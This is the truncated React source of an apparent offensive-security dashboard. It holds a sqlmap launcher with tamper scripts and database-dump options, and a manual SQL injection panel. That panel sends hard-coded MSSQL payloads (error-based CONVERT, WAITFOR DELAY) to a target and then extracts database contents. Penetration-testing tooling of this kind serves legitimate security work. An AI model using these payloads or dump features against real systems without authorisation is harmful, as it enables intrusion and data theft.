import { useState, useEffect, useRef, useCallback } from 'react'
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query'
import {
  Database, Play, Square, Terminal, Trash2, Clock,
  CheckCircle, XCircle, Loader, RefreshCw, Copy, X,
  ChevronRight, AlertTriangle, Search, Download, Plus
} from 'lucide-react'
import toast from 'react-hot-toast'
import { api } from '../lib/api'

const TAMPER_SCRIPTS = [
  'apostrophemask','base64encode','between','bluecoat','chardoubleencode',
  'charencode','charunicodeencode','equaltolike','escapequotes','greatest',
  'htmlencode','lowercase','multiplespaces','randomcase','randomcomments',
  'sp_password','space2comment','space2dash','space2plus','space2randomblank',
  'unionalltounion','unmagicquotes','uppercase','versionedkeywords',
]
const TECHNIQUES = [
  { id: 'B', label: 'Boolean-based Blind' },
  { id: 'E', label: 'Error-based' },
  { id: 'U', label: 'Union-based' },
  { id: 'S', label: 'Stacked Queries' },
  { id: 'T', label: 'Time-based Blind' },
  { id: 'Q', label: 'Inline Queries' },
]
const DBMS_LIST = ['','MySQL','PostgreSQL','Microsoft SQL Server','Oracle','SQLite']
const STATUS_ICON: Record<string, any> = {
  completed: <CheckCircle size={12} className="text-severity-low" />,
  running:   <Loader size={12} className="text-accent-primary animate-spin" />,
  queued:    <Clock size={12} className="text-text-muted" />,
  failed:    <XCircle size={12} className="text-severity-critical" />,
  cancelled: <XCircle size={12} className="text-text-muted" />,
}

// ── SessionsList ──────────────────────────────────────────────
function SessionsList({ onSelect, selectedId }: { onSelect: (s: any) => void, selectedId?: string }) {
  const queryClient = useQueryClient()
  const { data } = useQuery({
    queryKey: ['sqli-sessions'],
    queryFn: () => api.get('/sqli/sessions').then(r => r.data),
    refetchInterval: 8000,
  })
  const deleteMutation = useMutation({
    mutationFn: (id: string) => api.delete(`/sqli/sessions/${id}`),
    onSuccess: () => { toast.success('Deleted'); queryClient.invalidateQueries({ queryKey: ['sqli-sessions'] }) },
  })
  const sessions = data?.items || data || []
  return (
    <div className="flex flex-col h-full">
      <div className="p-3 border-b border-border-default flex items-center justify-between">
        <span className="text-xs font-mono text-text-muted uppercase">sqlmap ({sessions.length})</span>
        <button onClick={() => queryClient.invalidateQueries({ queryKey: ['sqli-sessions'] })}
          className="text-text-muted hover:text-text-primary"><RefreshCw size={12} /></button>
      </div>
      <div className="flex-1 overflow-y-auto">
        {sessions.length === 0
          ? <div className="p-4 text-center text-xs text-text-muted font-mono">No sessions</div>
          : sessions.map((s: any) => (
            <div key={s.id} onClick={() => onSelect(s)}
              className={`p-3 border-b border-border-default cursor-pointer hover:bg-bg-hover transition-colors ${selectedId === s.id ? 'bg-bg-hover border-l-2 border-l-accent-primary' : ''}`}>
              <div className="flex items-center gap-1.5 mb-1">
                {STATUS_ICON[s.status] || <Clock size={12} />}
                <span className="text-xs font-mono text-text-primary truncate flex-1">{s.target_value?.slice(0,30)}...</span>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-xs font-mono text-text-muted">{s.status}</span>
                <button onClick={e => { e.stopPropagation(); deleteMutation.mutate(s.id) }}
                  className="text-text-muted hover:text-severity-critical"><Trash2 size={10} /></button>
              </div>
            </div>
          ))}
      </div>
    </div>
  )
}

// ── XTerminal (polling) ───────────────────────────────────────
function XTerminal({ sessionId }: { sessionId: string }) {
  const [lines, setLines] = useState<string[]>([])
  const [status, setStatus] = useState('idle')
  const bottomRef = useRef<HTMLDivElement>(null)
  const prevSessionId = useRef<string>('')
  const intervalRef = useRef<any>(null)

  useEffect(() => {
    if (!sessionId) return
    if (prevSessionId.current !== sessionId) {
      prevSessionId.current = sessionId
      setLines([])
      setStatus('idle')
    }
    const poll = async () => {
      try {
        const authRaw = localStorage.getItem('offensecops-auth')
        const token = authRaw ? JSON.parse(authRaw)?.state?.accessToken || '' : ''
        const res = await fetch(`/api/sqli/session/${sessionId}/output`, {
          headers: { Authorization: `Bearer ${token}` }
        })
        if (!res.ok) return
        const data = await res.json()
        setStatus(data.status || 'idle')
        if (data.output) {
          setLines(data.output.split('\n').filter((l: string) => l.trim()))
        }
      } catch(e) {}
    }
    poll()
    intervalRef.current = setInterval(poll, 3000)
    return () => clearInterval(intervalRef.current)
  }, [sessionId])

  useEffect(() => {
    bottomRef.current?.scrollIntoView({ behavior: 'smooth' })
  }, [lines])

  const colorLine = (l: string) => {
    if (l.includes('[CRITICAL]') || l.includes('[-]')) return 'text-red-400'
    if (l.includes('[WARNING]') || l.includes('[!]')) return 'text-yellow-400'
    if (l.includes('[+]') || l.includes('[*]')) return 'text-green-400'
    if (l.startsWith('|') || l.startsWith('+--')) return 'text-white'
    if (l.startsWith('[CMD]')) return 'text-cyan-400'
    return 'text-green-300'
  }

  return (
    <div className="h-full flex flex-col bg-black rounded-lg overflow-hidden">
      <div className="flex items-center gap-2 px-3 py-2 border-b border-gray-800 flex-shrink-0">
        <div className={`w-2 h-2 rounded-full flex-shrink-0 ${
          status === 'running' ? 'bg-yellow-400 animate-pulse' :
          status === 'completed' ? 'bg-green-400' :
          status === 'failed' ? 'bg-red-400' : 'bg-gray-600'}`} />
        <span className="text-xs font-mono text-gray-400 truncate">Session {sessionId.slice(0,8)}...</span>
        <span className="text-xs font-mono text-gray-500 ml-auto flex-shrink-0">{lines.length} lines</span>
      </div>
      <div className="flex-1 overflow-y-auto p-3 font-mono text-xs leading-5">
        {lines.length === 0 ? (
          <div className="text-gray-600 text-center mt-8">
            {status === 'queued' ? '⏳ Waiting for sqlmap to start...' :
             status === 'running' ? '🔄 sqlmap running...' :
             '📋 Select a session to view output'}
          </div>
        ) : lines.map((l, i) => (
          <div key={i} className={`${colorLine(l)} whitespace-pre-wrap break-all`}>{l}</div>
        ))}
        <div ref={bottomRef} />
      </div>
    </div>
  )
}

// ── Command Preview ───────────────────────────────────────────
const defaultForm = {
  url: '', method: 'GET', data: '', cookie: '', headers: '',
  proxy: '', injection_param: '', technique: 'BEUSTQ',
  level: 1, risk: 1, dbms: '', threads: 1, time_sec: 5, retries: 3,
  tamper: [] as string[], random_agent: false, prefix: '', suffix: '',
  get_dbs: false, get_tables: false, get_columns: false, dump: false, dump_table: '', dump_db: '',
  tool: 'sqlmap', session_name: '',
}

function CommandPreview({ form }: { form: any }) {
  const parts = ['sqlmap']
  if (form.url) parts.push(`-u "${form.url}"`)
  if (form.method === 'POST') parts.push('--method POST')
  if (form.data) parts.push(`--data "${form.data.slice(0,30)}..."`)
  if (form.cookie) parts.push(`--cookie "..."`)
  if (form.injection_param) parts.push(`-p ${form.injection_param}`)
  parts.push(`--technique ${form.technique}`)
  if (form.level > 1) parts.push(`--level ${form.level}`)
  if (form.risk > 1) parts.push(`--risk ${form.risk}`)
  if (form.dbms) parts.push(`--dbms "${form.dbms}"`)
  if (form.threads > 1) parts.push(`--threads ${form.threads}`)
  if (form.tamper.length) parts.push(`--tamper ${form.tamper.join(',')}`)
  if (form.random_agent) parts.push('--random-agent')
  if (form.get_dbs) parts.push('--dbs')
  if (form.get_tables) parts.push('--tables')
  if (form.get_columns) parts.push('--columns')
  if (form.dump) parts.push('--dump')
  if (form.dump_db) parts.push(`-D ${form.dump_db}`)
  if (form.dump_table) parts.push(`-T ${form.dump_table}`)
  parts.push('--batch')
  return (
    <div className="bg-black rounded-lg p-3 font-mono text-xs text-green-400 overflow-x-auto whitespace-pre-wrap break-all leading-5">
      {parts.join(' \\\n  ')}
    </div>
  )
}

// ── Sqlmap Panel ──────────────────────────────────────────────
function SqlmapPanel() {
  const [form, setForm] = useState({ ...defaultForm })
  const [activeSession, setActiveSession] = useState<any>(null)
  const [activeTab, setActiveTab] = useState<'basic'|'advanced'|'enum'>('basic')
  const [showRaw, setShowRaw] = useState(false)
  const [rawReq, setRawReq] = useState('')
  const queryClient = useQueryClient()
  const set = (k: string, v: any) => setForm(f => ({ ...f, [k]: v }))
  const toggleTamper = (t: string) => set('tamper', form.tamper.includes(t) ? form.tamper.filter(x => x !== t) : [...form.tamper, t])
  const toggleTech = (id: string) => set('technique', form.technique.includes(id) ? form.technique.replace(id, '') : form.technique + id)

  const parseRawSqlmap = () => {
    try {
      const lines = rawReq.trim().split('\n')
      const firstLine = lines[0].trim()
      const methodMatch = firstLine.match(/^(GET|POST|PUT|PATCH|DELETE)\s+(\S+)/)
      if (!methodMatch) { toast.error('Invalid request'); return }
      const method = methodMatch[1]
      const path = methodMatch[2]
      let host = '', cookie = '', extraHeaders: string[] = []
      let bodyStart = -1
      for (let i = 1; i < lines.length; i++) {
        const line = lines[i]
        if (line.trim() === '') { bodyStart = i + 1; break }
        const idx = line.indexOf(':')
        if (idx < 0) continue
        const k = line.substring(0, idx).trim().toLowerCase()
        const v = line.substring(idx + 1).trim()
        if (k === 'host') host = v.split('/')[0]
        else if (k === 'cookie') cookie = v
        else if (k === 'token') extraHeaders.push(`Token: ${v}`)
        else if (k === 'authorization') extraHeaders.push(`Authorization: ${v}`)
        else if (!['user-agent','accept','accept-language','accept-encoding',
                   'content-length','upgrade-insecure-requests','sec-fetch-dest',
                   'sec-fetch-mode','sec-fetch-site','sec-fetch-user','priority',
                   'te','connection','origin','referer','sec-ch-ua','sec-ch-ua-mobile',
                   'sec-ch-ua-platform','content-type'].includes(k)) {
          extraHeaders.push(`${line.substring(0,idx).trim()}: ${v}`)
        }
      }
      const hostOnly = host.split('/')[0]
      let url = host.includes(path.replace(/^\//, '')) ? `https://${host}` : `https://${hostOnly}${path}`
      let data = ''
      if (bodyStart > 0) {
        const bodyRaw = lines.slice(bodyStart).join('\n').trim()
        const parts = bodyRaw.split(/\n\s*\n/).map(b => b.trim()).filter(Boolean)
        data = parts[parts.length - 1] || bodyRaw
      }
      let injectionParam = ''
      try {
        const urlObj = new URL(url)
        const params = Array.from(urlObj.searchParams.keys())
        if (params.length > 0) injectionParam = params[params.length - 1]
      } catch(e) {}
      if (!injectionParam && data) {
        try {
          const keys = Object.keys(JSON.parse(data))
          if (keys.length) injectionParam = keys[keys.length - 1]
        } catch(e) {
          const pairs = data.split('&')
          if (pairs.length) injectionParam = pairs[pairs.length - 1].split('=')[0]
        }
      }
      setForm(f => ({ ...f, url, method, data, cookie, headers: extraHeaders.join('\n'), injection_param: injectionParam }))
      setShowRaw(false); setRawReq('')
      toast.success(`Imported! URL: ${url.substring(0,50)}...`)
    } catch(e: any) { toast.error('Parse error: ' + e.message) }
  }

  const runMutation = useMutation({
    mutationFn: () => api.post('/sqli/run', { ...form, tool: 'sqlmap' }),
    onSuccess: (res) => {
      toast.success('sqlmap queued!')
      setActiveSession(res.data)
      queryClient.invalidateQueries({ queryKey: ['sqli-sessions'] })
    },
    onError: (e: any) => toast.error(e.response?.data?.detail || 'Failed'),
  })

  return (
    <div className="flex gap-4 h-full min-h-0">
      <div className="w-52 flex-shrink-0 card overflow-hidden flex flex-col">
        <SessionsList onSelect={setActiveSession} selectedId={activeSession?.id} />
      </div>
      <div className="w-96 flex-shrink-0 card overflow-y-auto">
        <div className="flex border-b border-border-default">
          {(['basic','advanced','enum'] as const).map(tab => (
            <button key={tab} onClick={() => setActiveTab(tab)}
              className={`flex-1 py-2.5 text-xs font-mono capitalize transition-colors ${
                activeTab === tab ? 'text-accent-primary border-b-2 border-accent-primary' : 'text-text-muted hover:text-text-secondary'
              }`}>{tab}</button>
          ))}
        </div>
        <div className="p-4 space-y-3">
          {activeTab === 'basic' && (
            <>
              <div>
                <button onClick={() => setShowRaw(!showRaw)}
                  className="w-full flex items-center justify-center gap-2 px-3 py-2 rounded-lg text-xs font-mono border border-accent-primary text-accent-primary hover:bg-accent-primary hover:bg-opacity-10 transition-all">
                  📋 Import Raw HTTP Request
                </button>
                {showRaw && (
                  <div className="mt-2 space-y-2">
                    <textarea value={rawReq} onChange={e => setRawReq(e.target.value)}
                      rows={10} className="input-field font-mono text-xs w-full resize-none"
                      placeholder={"GET /api/search?q=test HTTP/1.1\nHost: example.com\nCookie: session=abc\n\n"} />
                    <div className="flex gap-2">
                      <button onClick={parseRawSqlmap} className="flex-1 py-1.5 btn-primary rounded font-mono text-xs font-bold">Parse & Import</button>
                      <button onClick={() => { setShowRaw(false); setRawReq('') }}
                        className="px-3 py-1.5 rounded border border-border-default text-text-muted font-mono text-xs">Cancel</button>
                    </div>
                  </div>
                )}
              </div>
              <div>
                <label className="label-field">Target URL *</label>
                <input value={form.url} onChange={e => set('url', e.target.value)}
                  className="input-field font-mono text-sm" placeholder="https://target.com/page?id=1" />
              </div>
              <div className="grid grid-cols-2 gap-2">
                <div>
                  <label className="label-field">Method</label>
                  <select value={form.method} onChange={e => set('method', e.target.value)} className="input-field text-sm">
                    {['GET','POST','PUT'].map(m => <option key={m}>{m}</option>)}
                  </select>
                </div>
                <div>
                  <label className="label-field">Inject Param</label>
                  <input value={form.injection_param} onChange={e => set('injection_param', e.target.value)}
                    className="input-field font-mono text-sm" placeholder="id" />
                </div>
              </div>
              {form.method !== 'GET' && (
                <div>
                  <label className="label-field">POST Data (gunakan * untuk inject)</label>
                  <textarea value={form.data} onChange={e => set('data', e.target.value)}
                    className="input-field h-16 resize-none font-mono text-xs"
                    placeholder={'{"keywords":"*","pageNumber":1}'} />
                </div>
              )}
              <div>
                <label className="label-field">Cookie</label>
                <input value={form.cookie} onChange={e => set('cookie', e.target.value)}
                  className="input-field font-mono text-sm" placeholder="session=abc123" />
              </div>
              <div>
                <label className="label-field mb-2">Techniques</label>
                <div className="flex flex-wrap gap-1.5">
                  {TECHNIQUES.map(t => (
                    <button key={t.id} onClick={() => toggleTech(t.id)} title={t.label}
                      className={`text-xs font-mono px-2 py-1 rounded border transition-all ${
                        form.technique.includes(t.id)
                          ? 'bg-accent-primary bg-opacity-10 border-accent-primary text-accent-primary'
                          : 'border-border-default text-text-muted hover:border-border-muted'
                      }`}>{t.id}</button>
                  ))}
                </div>
              </div>
              <div className="grid grid-cols-3 gap-2">
                {[['level',5],['risk',3],['threads',10]].map(([k, max]) => (
                  <div key={String(k)}>
                    <label className="label-field capitalize">{k}</label>
                    <select value={(form as any)[k as string]} onChange={e => set(k as string, +e.target.value)} className="input-field text-sm">
                      {Array.from({length: max as number}, (_, i) => i+1).map(n => <option key={n}>{n}</option>)}
                    </select>
                  </div>
                ))}
              </div>
              <div>
                <label className="label-field">DBMS</label>
                <select value={form.dbms} onChange={e => set('dbms', e.target.value)} className="input-field text-sm">
                  {DBMS_LIST.map(d => <option key={d} value={d}>{d || 'Auto-detect'}</option>)}
                </select>
              </div>
            </>
          )}
          {activeTab === 'advanced' && (
            <>
              <div>
                <label className="label-field">Headers (one per line)</label>
                <textarea value={form.headers} onChange={e => set('headers', e.target.value)}
                  className="input-field h-20 resize-none font-mono text-xs"
                  placeholder={"Authorization: Bearer token\nContent-Type: application/json"} />
              </div>
              <div>
                <label className="label-field">Proxy</label>
                <input value={form.proxy} onChange={e => set('proxy', e.target.value)}
                  className="input-field font-mono text-sm" placeholder="http://127.0.0.1:8080" />
              </div>
              <div className="grid grid-cols-2 gap-2">
                <div><label className="label-field">Prefix</label>
                  <input value={form.prefix} onChange={e => set('prefix', e.target.value)} className="input-field font-mono text-sm" placeholder="') OR " /></div>
                <div><label className="label-field">Suffix</label>
                  <input value={form.suffix} onChange={e => set('suffix', e.target.value)} className="input-field font-mono text-sm" placeholder="-- -" /></div>
              </div>
              <div className="flex items-center gap-2">
                <input type="checkbox" id="ra" checked={form.random_agent} onChange={e => set('random_agent', e.target.checked)} className="accent-accent-primary" />
                <label htmlFor="ra" className="text-xs font-mono text-text-secondary">--random-agent</label>
              </div>
              <div>
                <label className="label-field mb-2">Tamper Scripts ({form.tamper.length})</label>
                <div className="flex flex-wrap gap-1.5 max-h-32 overflow-y-auto">
                  {TAMPER_SCRIPTS.map(t => (
                    <button key={t} onClick={() => toggleTamper(t)}
                      className={`text-xs font-mono px-2 py-1 rounded border transition-all ${
                        form.tamper.includes(t) ? 'bg-accent-primary bg-opacity-10 border-accent-primary text-accent-primary' : 'border-border-default text-text-muted hover:border-border-muted'
                      }`}>{t}</button>
                  ))}
                </div>
              </div>
            </>
          )}
          {activeTab === 'enum' && (
            <>
              {/* --dbs */}
              <label className={`flex items-start gap-3 p-3 rounded-lg border cursor-pointer transition-all ${
                form.get_dbs ? 'border-accent-primary bg-accent-primary bg-opacity-5' : 'border-border-default hover:border-border-muted'
              }`}>
                <input type="checkbox" checked={form.get_dbs} onChange={e => set('get_dbs', e.target.checked)} className="mt-0.5 accent-accent-primary" />
                <div>
                  <p className="text-xs font-mono text-accent-primary">--dbs</p>
                  <p className="text-xs text-text-muted">Enumerate all databases</p>
                </div>
              </label>

              {/* --tables with db selector */}
              <label className={`flex items-start gap-3 p-3 rounded-lg border cursor-pointer transition-all ${
                form.get_tables ? 'border-accent-primary bg-accent-primary bg-opacity-5' : 'border-border-default hover:border-border-muted'
              }`}>
                <input type="checkbox" checked={form.get_tables} onChange={e => set('get_tables', e.target.checked)} className="mt-0.5 accent-accent-primary" />
                <div className="flex-1">
                  <p className="text-xs font-mono text-accent-primary">--tables</p>
                  <p className="text-xs text-text-muted">Enumerate tables (optionally in specific DB)</p>
                </div>
              </label>
              {form.get_tables && (
                <div className="pl-2">
                  <label className="label-field">Database (optional, untuk -D flag)</label>
                  <input value={form.dump_db} onChange={e => set('dump_db', e.target.value)}
                    className="input-field font-mono text-sm" placeholder="dbname (kosongkan = semua DB)" />
                </div>
              )}

              {/* --columns */}
              <label className={`flex items-start gap-3 p-3 rounded-lg border cursor-pointer transition-all ${
                (form as any).get_columns ? 'border-accent-primary bg-accent-primary bg-opacity-5' : 'border-border-default hover:border-border-muted'
              }`}>
                <input type="checkbox" checked={(form as any).get_columns || false}
                  onChange={e => set('get_columns', e.target.checked)} className="mt-0.5 accent-accent-primary" />
                <div className="flex-1">
                  <p className="text-xs font-mono text-accent-primary">--columns</p>
                  <p className="text-xs text-text-muted">Enumerate columns in a table</p>
                </div>
              </label>
              {(form as any).get_columns && (
                <div className="pl-2 grid grid-cols-2 gap-2">
                  <div>
                    <label className="label-field">Database (-D)</label>
                    <input value={form.dump_db} onChange={e => set('dump_db', e.target.value)}
                      className="input-field font-mono text-sm" placeholder="dbname" />
                  </div>
                  <div>
                    <label className="label-field">Table (-T) *</label>
                    <input value={form.dump_table} onChange={e => set('dump_table', e.target.value)}
                      className="input-field font-mono text-sm" placeholder="tablename" />
                  </div>
                </div>
              )}

              {/* --dump */}
              <label className={`flex items-start gap-3 p-3 rounded-lg border cursor-pointer transition-all ${
                form.dump ? 'border-accent-primary bg-accent-primary bg-opacity-5' : 'border-border-default hover:border-border-muted'
              }`}>
                <input type="checkbox" checked={form.dump} onChange={e => set('dump', e.target.checked)} className="mt-0.5 accent-accent-primary" />
                <div>
                  <p className="text-xs font-mono text-accent-primary">--dump</p>
                  <p className="text-xs text-text-muted">Dump table data</p>
                </div>
              </label>
              {form.dump && (
                <div className="pl-2 grid grid-cols-2 gap-2">
                  <div>
                    <label className="label-field">Database (-D)</label>
                    <input value={form.dump_db} onChange={e => set('dump_db', e.target.value)}
                      className="input-field font-mono text-sm" placeholder="dbname" />
                  </div>
                  <div>
                    <label className="label-field">Table (-T)</label>
                    <input value={form.dump_table} onChange={e => set('dump_table', e.target.value)}
                      className="input-field font-mono text-sm" placeholder="users" />
                  </div>
                </div>
              )}
            </>
          )}
        </div>
        <div className="p-4 border-t border-border-default">
          <p className="label-field mb-2">Command Preview</p>
          <CommandPreview form={form} />
        </div>
        <div className="p-4 border-t border-border-default flex gap-2">
          <button onClick={() => runMutation.mutate()} disabled={runMutation.isPending || !form.url}
            className="btn-primary flex-1 flex items-center justify-center gap-2">
            {runMutation.isPending ? <><Loader size={14} className="animate-spin" /> Queuing...</> : <><Play size={14} /> Run sqlmap</>}
          </button>
          <button onClick={() => setForm({ ...defaultForm })} className="btn-secondary px-3"><X size={14} /></button>
        </div>
      </div>
      <div className="flex-1 card overflow-hidden flex flex-col min-h-0">
        {activeSession ? (
          <>
            <div className="flex items-center justify-between p-3 border-b border-border-default flex-shrink-0">
              <div className="flex items-center gap-2">
                <Terminal size={14} className="text-accent-primary" />
                <span className="font-mono text-sm text-text-primary truncate max-w-xs">{activeSession.target_value}</span>
              </div>
              <button onClick={() => setActiveSession(null)} className="text-text-muted hover:text-text-primary"><X size={14} /></button>
            </div>
            <div className="flex-1 min-h-0"><XTerminal key={activeSession.id} sessionId={activeSession.id} /></div>
          </>
        ) : (
          <div className="flex-1 flex items-center justify-center">
            <div className="text-center">
              <Terminal size={40} className="text-text-muted mx-auto mb-3" />
              <p className="text-text-secondary text-sm">Configure & run sqlmap</p>
              <p className="text-text-muted text-xs font-mono mt-1">atau pilih session dari history</p>
            </div>
          </div>
        )}
      </div>
    </div>
  )
}

// ── Manual SQLi Panel ─────────────────────────────────────────
function ManualSQLiPanel() {
  const [config, setConfig] = useState({
    url: '', method: 'POST', bearer: '', contentType: 'application/json',
    jsonBody: '{"keywords":"","pageNumber":1,"rowPerPage":10,"GroupId":""}',
    formBody: '', cookieHeader: '', extraHeaders: '', vulnerableParam: '', dbms: 'mssql',
  })
  const [parsed, setParsed] = useState<any>(null)
  const [parseError, setParseError] = useState('')
  const [params, setParams] = useState<[string, any][]>([])
  const [step, setStep] = useState<'config'|'test'|'extract'>('config')
  const [testResults, setTestResults] = useState<any[]>([])
  const [testing, setTesting] = useState(false)
  const [extracting, setExtracting] = useState(false)
  const [extractResults, setExtractResults] = useState<Record<string,any>>({})
  const [extractParams, setExtractParams] = useState({ db:'', table:'', col:'', limit:10 })
  const [extractLog, setExtractLog] = useState<string[]>([])
  const [showRawImport, setShowRawImport] = useState(false)
  const [rawRequest, setRawRequest] = useState('')
  const setC = (k: string, v: any) => setConfig(c => ({ ...c, [k]: v }))

  const buildFormBody = () => {
    if (config.contentType !== 'application/x-www-form-urlencoded') return undefined
    const obj: Record<string,string> = {}
    config.formBody.split('&').forEach((pair:string) => {
      const [k, v] = pair.split('=')
      if (k) obj[decodeURIComponent(k)] = decodeURIComponent(v || '')
    })
    return obj
  }

  const buildHeaders = () => {
    const h: Record<string,string> = { 'Content-Type': config.contentType }
    if (config.bearer) h['Authorization'] = `Bearer ${config.bearer}`
    if (config.cookieHeader) h['Cookie'] = config.cookieHeader
    if (config.extraHeaders) {
      config.extraHeaders.split('\n').forEach((line:string) => {
        const idx = line.indexOf(':')
        if (idx > 0) h[line.substring(0,idx).trim()] = line.substring(idx+1).trim()
      })
    }
    return h
  }

  const parseRawRequest = () => {
    try {
      const lines = rawRequest.trim().split('\n')
      const methodMatch = lines[0].trim().match(/^(GET|POST|PUT|PATCH|DELETE)\s+(\S+)/)
      if (!methodMatch) { toast.error('Invalid request format'); return }
      const method = methodMatch[1], path = methodMatch[2]
      let hostLine = '', contentType = 'application/json', cookieHeader = ''
      let extraHeaders: string[] = [], bodyStart = -1
      for (let i = 1; i < lines.length; i++) {
        const line = lines[i]
        if (line.trim() === '') { bodyStart = i + 1; break }
        const colonIdx = line.indexOf(':')
        if (colonIdx === -1) continue
        const hKey = line.substring(0, colonIdx).trim().toLowerCase()
        const hVal = line.substring(colonIdx + 1).trim()
        if (hKey === 'host') hostLine = hVal
        else if (hKey === 'content-type') contentType = hVal.split(';')[0].trim()
        else if (hKey === 'cookie') cookieHeader = hVal
        else if (hKey === 'authorization') setC('bearer', hVal.replace(/^Bearer\s+/i, ''))
        else if (hKey === 'token') setC('bearer', hVal)
        else if (!['user-agent','accept','accept-language','accept-encoding','content-length',
                   'upgrade-insecure-requests','sec-fetch-dest','sec-fetch-mode','sec-fetch-site',
                   'sec-fetch-user','priority','te','connection','origin','referer',
                   'sec-ch-ua','sec-ch-ua-mobile','sec-ch-ua-platform'].includes(hKey)) {
          extraHeaders.push(`${line.substring(0,colonIdx).trim()}: ${hVal}`)
        }
      }
      const hostOnly = hostLine.split('/')[0]
      const url = hostLine && hostLine.includes(path.replace(/^\//, ''))
        ? `https://${hostLine}` : hostLine ? `https://${hostOnly}${path}` : path
      let body = ''
      if (bodyStart > 0) {
        const bodyRaw = lines.slice(bodyStart).join('\n').trim()
        const parts = bodyRaw.split(/\n\s*\n/).map((b:string) => b.trim()).filter(Boolean)
        body = parts.length > 1 ? parts[parts.length - 1] : bodyRaw
        if (parts.length > 1) toast.success(`Found ${parts.length} body blocks — using last one`)
      }
      setConfig(c => ({
        ...c, url, method, contentType, cookieHeader,
        extraHeaders: extraHeaders.join('\n'),
        jsonBody: contentType === 'application/json' ? body : c.jsonBody,
        formBody: contentType === 'application/x-www-form-urlencoded' ? body : c.formBody,
      }))
      setShowRawImport(false); setRawRequest('')
      toast.success('Request imported!')
    } catch(e: any) { toast.error('Parse error: ' + e.message) }
  }

  const parseJSON = () => {
    try {
      if (['GET','DELETE'].includes(config.method.toUpperCase())) {
        try {
          const urlObj = new URL(config.url)
          const flat: [string,any][] = []
          urlObj.searchParams.forEach((v,k) => flat.push([k,v]))
          if (flat.length > 0) {
            const obj: Record<string,any> = {}
            flat.forEach(([k,v]) => { obj[k] = v })
            setParsed(obj); setParams(flat); setParseError(''); setStep('test')
            toast.success(`URL params parsed — ${flat.length} params`); return
          }
        } catch(e) {}
      }
      if (config.contentType === 'application/x-www-form-urlencoded') {
        const flat: [string,any][] = []
        config.formBody.split('&').forEach(pair => {
          const [k,v] = pair.split('=')
          if (k) flat.push([decodeURIComponent(k), decodeURIComponent(v||'')])
        })
        const obj: Record<string,any> = {}
        flat.forEach(([k,v]) => { obj[k] = v })
        setParsed(obj); setParams(flat); setParseError(''); setStep('test')
        toast.success(`Form parsed — ${flat.length} params`); return
      }
      let cleanBody = config.jsonBody.trim()
      if (cleanBody.includes('\n{')) {
        const parts = cleanBody.split(/\r?\n\s*\r?\n/).map((s:string) => s.trim()).filter(Boolean)
        for (let i = parts.length - 1; i >= 0; i--) {
          try { JSON.parse(parts[i]); cleanBody = parts[i]; break } catch(e) {}
        }
      }
      const obj = JSON.parse(cleanBody)
      setParsed(obj); setParseError('')
      const flat: [string,any][] = []
      const walk = (o: any, prefix='') => {
        if (typeof o === 'object' && o !== null && !Array.isArray(o))
          Object.entries(o).forEach(([k,v]) => walk(v, prefix ? `${prefix}.${k}` : k))
        else if (Array.isArray(o)) o.forEach((v,i) => walk(v, `${prefix}[${i}]`))
        else flat.push([prefix, o])
      }
      walk(obj); setParams(flat); setStep('test')
      toast.success('JSON parsed — pilih parameter')
    } catch(e: any) { setParseError(e.message) }
  }

  const addLog = (msg: string) => setExtractLog(l => [...l, `[${new Date().toLocaleTimeString()}] ${msg}`])

  const runTest = async () => {
    if (!config.vulnerableParam) { toast.error('Pilih parameter terlebih dahulu'); return }
    setTesting(true); setTestResults([])
    const payloads = [
      { name: "Single Quote", payload: "'" },
      { name: "Comment", payload: "' --" },
      { name: "Error-based CONVERT", payload: "'; SELECT CONVERT(int, DB_NAME())--" },
      { name: "Time Delay (2s)", payload: "' WAITFOR DELAY '00:00:02'--" },
    ]
    const results: any[] = []
    for (const { name, payload } of payloads) {
      try {
        const res = await api.post('/sqli/manual/test', {
          url: config.url, method: config.method, headers: buildHeaders(),
          json_body: config.contentType === 'application/json' ? parsed : null,
          form_body: buildFormBody(),
          vulnerable_param: config.vulnerableParam, payload, timeout: 10,
        })
        results.push({ name, payload, ...res.data }); setTestResults([...results])
      } catch(e: any) {
        results.push({ name, payload, is_vulnerable: false, raw_message: e.message })
        setTestResults([...results])
      }
    }
    setTesting(false)
    if (results.some(r => r.is_vulnerable)) {
      toast.success('Vulnerable! Lanjut ke Extraction'); setStep('extract')
    } else toast.error('Tidak vulnerable atau perlu teknik berbeda')
  }

  const runExtract = async (action: string) => {
    if (!config.vulnerableParam) { toast.error('Konfigurasi dulu'); return }
    setExtracting(true); addLog(`Extracting: ${action}...`)
    try {
      const res = await api.post('/sqli/manual/extract', {
        url: config.url, method: config.method, headers: buildHeaders(),
        json_body: config.contentType === 'application/json' ? parsed : null,
        form_body: buildFormBody(),
        vulnerable_param: config.vulnerableParam, dbms: config.dbms, action,
        db_name: extractParams.db, table_name: extractParams.table,
        column_name: extractParams.col, limit: extractParams.limit,
      })
      const d = res.data
      if (d.result) {
        addLog(`✓ ${action}: ${d.result}`)
        setExtractResults(r => ({ ...r, [action]: d.result }))
      } else if (d.items?.length > 0) {
        addLog(`✓ Found ${d.items.length} items`)
        d.items.forEach((item: string, i: number) => addLog(`  ${i+1}. ${item}`))
        setExtractResults(r => ({ ...r, [action]: d.items }))
      } else addLog(`✗ No result for ${action}`)
    } catch(e: any) { addLog(`✗ Error: ${e.response?.data?.detail || e.message}`) }
    setExtracting(false)
  }

  const exportResults = () => {
    const blob = new Blob([JSON.stringify(extractResults, null, 2)], { type: 'application/json' })
    const a = document.createElement('a'); a.href = URL.createObjectURL(blob)
    a.download = `sqli_results_${Date.now()}.json`; a.click()
  }

  return (
    <div className="flex gap-4 h-full min-h-0">
      <div className="w-96 flex-shrink-0 card overflow-y-auto">
        <div className="flex border-b border-border-default">
          {(['config','test','extract'] as const).map((s, i) => (
            <button key={s} onClick={() => step !== 'config' && setStep(s)}
              className={`flex-1 py-2.5 text-xs font-mono capitalize flex items-center justify-center gap-1 transition-colors ${
                step === s ? 'text-accent-primary border-b-2 border-accent-primary' : 'text-text-muted hover:text-text-secondary'
              }`}>
              <span className={`w-4 h-4 rounded-full text-xs flex items-center justify-center ${step === s ? 'bg-accent-primary text-black' : 'bg-bg-tertiary text-text-muted'}`}>{i+1}</span>
              {s}
            </button>
          ))}
        </div>
        <div className="p-4 space-y-3">
          {step === 'config' && (
            <>
              <p className="text-xs font-mono text-accent-primary font-semibold">STEP 1: Target Configuration</p>
              <div>
                <button onClick={() => setShowRawImport(!showRawImport)}
